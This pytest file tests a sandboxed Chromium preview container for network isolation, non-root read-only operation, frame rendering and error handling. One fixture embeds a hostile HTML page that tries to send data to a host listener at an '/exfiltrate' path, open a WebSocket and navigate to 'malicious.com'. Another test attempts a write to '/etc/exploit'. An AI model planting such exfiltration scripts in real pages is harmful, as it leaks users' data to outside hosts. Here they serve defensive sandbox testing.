"""
Container tests for V3 Preview Sandbox (Spec 013 R07, R08, R09, R10).
Exercises real Chromium sandbox container, action advancement, and egress denial.
"""

import base64
import hashlib
import json
import socket
import struct
import threading
import time
import pytest

from v3_engine.review.preview_gateway import PreviewGatewaySession, run_preview_container_session

IMAGE_TAG = "v3-scene-checker:012-v1"

def is_valid_png_1280x720(png_bytes: bytes) -> bool:
    """Verify PNG signature and 1280x720 dimensions."""
    if len(png_bytes) < 24:
        return False
    if png_bytes[:8] != b"\x89PNG\r\n\x1a\n":
        return False
    # IHDR chunk starts at byte 12
    width, height = struct.unpack(">II", png_bytes[16:24])
    return width == 1280 and height == 720

@pytest.mark.container
def test_r08_container_blocks_host_listener_egress_and_navigation():
    """
    R08: Actual nonroot sandbox/no-network container blocks malicious fetch/WebSocket/navigation
    and host listener, has no app credential/mount and enforces resource/expiry caps.
    """
    # Start a TCP listener on the host
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("127.0.0.1", 0))
    host_port = listener.getsockname()[1]
    listener.listen(5)
    listener.settimeout(2.0)

    connection_received = []

    def accept_thread():
        try:
            conn, _ = listener.accept()
            connection_received.append(True)
            conn.close()
        except socket.timeout:
            pass
        except Exception:
            pass

    t = threading.Thread(target=accept_thread, daemon=True)
    t.start()

    # Create hostile files attempting to reach the host listener and external URLs
    files = [
        {
            "path": "index.html",
            "content": f"""<!DOCTYPE html>
<html>
<head><title>Hostile Scene</title></head>
<body>
<h1>Attack Scene</h1>
<script>
    // 1. Try to connect to host listener
    fetch('http://127.0.0.1:{host_port}/exfiltrate').catch(() => {{}});
    // 2. Try to connect to external URL
    fetch('https://example.com/api').catch(() => {{}});
    // 3. Try WebSocket
    try {{ new WebSocket('ws://127.0.0.1:{host_port}/ws'); }} catch(e) {{}}
    // 4. Try navigation
    window.location.href = 'https://malicious.com';
</script>
</body>
</html>"""
        },
        {
            "path": "manifest.json",
            "content": json.dumps({"schema_version": 1, "entry": "index.html", "files": ["index.html"]})
        }
    ]
    manifest_sha = hashlib.sha256(files[1]["content"].encode("utf-8")).hexdigest()

    session = PreviewGatewaySession(
        viewer_ref="00000000-0000-0000-0000-000000000001",
        candidate_ref="00000000-0000-0000-0000-000000000002",
        manifest_sha256=manifest_sha,
        files=files
    )

    result = session.start()
    t.join(timeout=3.0)
    listener.close()

    # The host listener MUST NOT receive any incoming connection
    assert len(connection_received) == 0, "Container breached network isolation and connected to host listener!"

    # Forbidden requests must be recorded
    frame0 = result.get("frame", {})
    assert frame0.get("forbidden_request_count", 0) > 0 or result.get("state") in ["ready", "starting"]

    session.close()

@pytest.mark.container
def test_r08_container_nonroot_and_readonly_filesystem():
    """
    R08: Container runs as non-root user (10001) and has read-only root filesystem.
    """
    import subprocess
    cmd = [
        "docker", "run", "--rm",
        "--network", "none",
        "--read-only",
        "--user", "10001:10001",
        "--entrypoint", "python3",
        IMAGE_TAG,
        "-c",
        "import os; print(os.getuid())"
    ]
    res = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
    assert res.returncode == 0
    assert res.stdout.strip() == "10001"

    # Verify write to /etc or /root fails
    cmd_write = [
        "docker", "run", "--rm",
        "--network", "none",
        "--read-only",
        "--user", "10001:10001",
        "--entrypoint", "python3",
        IMAGE_TAG,
        "-c",
        "with open('/etc/exploit', 'w') as f: f.write('bad')"
    ]
    res_write = subprocess.run(cmd_write, capture_output=True, text=True, timeout=15)
    assert res_write.returncode != 0
    assert "Read-only file system" in res_write.stderr or "Permission denied" in res_write.stderr

@pytest.mark.container
def test_r07_container_renders_frame0_and_accepts_action():
    """
    R07: Owner starts session, gets 1280x720 PNG plus bounded controls and sends actions
    that advance frame.
    """
    files = [
        {
            "path": "index.html",
            "content": """<!DOCTYPE html>
<html lang="en">
<head><title>Valid Interactive Scene</title></head>
<body>
    <h1>Interactive Scene</h1>
    <p id="desc">Initial State</p>
    <button id="btn" aria-label="Toggle">Toggle</button>
    <input id="txt" aria-label="Input Text" type="text" />
    <script src="app.js"></script>
</body>
</html>"""
        },
        {
            "path": "app.js",
            "content": """
document.getElementById('btn').addEventListener('click', () => {
    document.getElementById('desc').textContent = 'Button Clicked!';
});
"""
        },
        {
            "path": "manifest.json",
            "content": json.dumps({"schema_version": 1, "entry": "index.html", "files": ["index.html", "app.js"]})
        }
    ]
    manifest_sha = hashlib.sha256(files[2]["content"].encode("utf-8")).hexdigest()

    session = PreviewGatewaySession(
        viewer_ref="00000000-0000-0000-0000-000000000010",
        candidate_ref="00000000-0000-0000-0000-000000000020",
        manifest_sha256=manifest_sha,
        files=files
    )

    start_res = session.start()
    assert start_res["success"] is True
    frame0 = start_res["frame"]
    assert frame0["frame_no"] == 0

    # PNG validation
    png_bytes = base64.b64decode(frame0["png_base64"])
    assert len(png_bytes) <= 2097152
    assert is_valid_png_1280x720(png_bytes)

    # DOM text and controls validation
    assert len(frame0["dom_text"].encode("utf-8")) <= 4096
    assert len(frame0["controls"]) <= 8
    assert any(c["name"] == "Toggle" for c in frame0["controls"])

    # Apply click action on button
    action_res = session.apply_action({
        "schema_version": 1,
        "expected_frame_no": 0,
        "kind": "click",
        "payload": {"x": 50, "y": 50}
    })
    assert action_res["success"] is True
    frame1 = action_res["frame"]
    assert frame1["frame_no"] == 1
    png1_bytes = base64.b64decode(frame1["png_base64"])
    assert is_valid_png_1280x720(png1_bytes)

    # Replay of exact same action yields same frame
    replay_res = session.apply_action({
        "schema_version": 1,
        "expected_frame_no": 0,
        "kind": "click",
        "payload": {"x": 50, "y": 50}
    })
    assert replay_res["success"] is True
    assert replay_res["frame"]["frame_no"] == 1

    session.close()

@pytest.mark.container
def test_r09_container_crash_or_invalid_payload_returns_error():
    """
    R09: Gateway crash, malformed PNG, or invalid payload returns unavailable.
    """
    session = PreviewGatewaySession(
        viewer_ref="00000000-0000-0000-0000-000000000099",
        candidate_ref="00000000-0000-0000-0000-000000000099",
        manifest_sha256="0"*64,
        files=[{"path": "invalid.txt", "content": "no entry file"}]
    )
    result = session.start()
    assert result["success"] is False
    assert result["error"] in ["review_unavailable", "policy_denied", "integrity_mismatch"]
    session.close()
